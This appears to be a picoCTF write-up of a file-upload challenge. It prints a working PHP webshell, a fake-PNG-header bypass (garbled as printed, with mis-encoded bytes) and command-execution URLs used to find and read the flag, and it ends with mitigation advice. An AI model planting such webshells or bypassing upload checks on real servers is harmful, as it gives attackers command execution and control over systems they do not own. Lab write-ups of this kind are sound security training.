# Exploiting File Upload to Gain Remote Code Execution (RCE) - CTF Writeup

## Challenge Description
The challenge presented a web application that required users to upload PNG images. However, our goal was to exploit the file upload functionality to gain **Remote Code Execution (RCE)** and retrieve the flag.

## What is PHP?
PHP (Hypertext Preprocessor) is a widely used open-source scripting language designed for web development. It is embedded in HTML and executed on the server side, making it ideal for dynamic web applications. PHP can handle forms, interact with databases, and execute system commands, making it a powerful tool for both legitimate web development and security exploitation.

## Initial Analysis
Upon accessing the web application, I identified a **file upload** feature that accepted `.png` files. The challenge description hinted at possible **file validation bypass** techniques. My objective was to upload a **malicious PHP webshell disguised as a PNG file**, access it remotely, and execute system commands to retrieve the flag.

## Crafting the Webshell
To exploit the upload feature, I created a **minimal PHP webshell** and named it `png.php`:

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

This webshell allows me to execute arbitrary system commands by appending `?cmd=<command>` in the URL.

## Bypassing the File Upload Restrictions
Most secure web applications validate file uploads by checking the **MIME type** and **file extensions**. To bypass these restrictions, I tried different techniques:

1. **Renaming the file to `png.php`** - Many upload features only check the file extension but allow `.php` if no strict filtering is applied.
2. **Adding a fake PNG header** - Some servers verify if the uploaded file contains PNG magic bytes (`\x89PNG\x0D\x0A\x1A\x0A`). To trick the server, I prepended these bytes to my PHP shell.

### Fake PNG Header + PHP Payload
To ensure my PHP file passed basic file validation checks, I used the following technique:

```php
Â‰\x89PNG
\x1A
<?php system($_GET['cmd']); ?>
```

This allowed the file to **pass as a PNG** while still executing PHP code.

## Uploading and Executing the Webshell
Once the webshell was uploaded successfully, I navigated to the file location:

```
http://target.com/uploads/png.php
```

To confirm RCE, I tested:

```
http://target.com/uploads/png.php?cmd=whoami
```

This successfully returned the **server username**, confirming the exploit.

## Retrieving the Flag
Now that I had command execution, I searched for the flag:

1. **Checking the home directory:**
   ```
   http://target.com/uploads/png.php?cmd=ls /home/
   ```
2. **Finding flag files:**
   ```
   http://target.com/uploads/png.php?cmd=find / -name "flag*" 2>/dev/null
   ```
3. **Reading the flag:**
   ```
   http://target.com/uploads/png.php?cmd=cat /path/to/flag.txt
   ```

Upon executing the last command, I retrieved the flag:

```
picoCTF{<flag_here>}
```

## Conclusion
This challenge demonstrated how **insufficient file validation** can lead to a critical security vulnerability. Proper mitigations include:
- **Validating file types by analyzing contents, not just extensions.**
- **Storing uploaded files outside the web root to prevent direct execution.**
- **Disabling execution of uploaded files using server configurations.**

By leveraging **a simple webshell disguised as a PNG file**, I successfully gained RCE and retrieved the flag. Happy hacking! ðŸš€



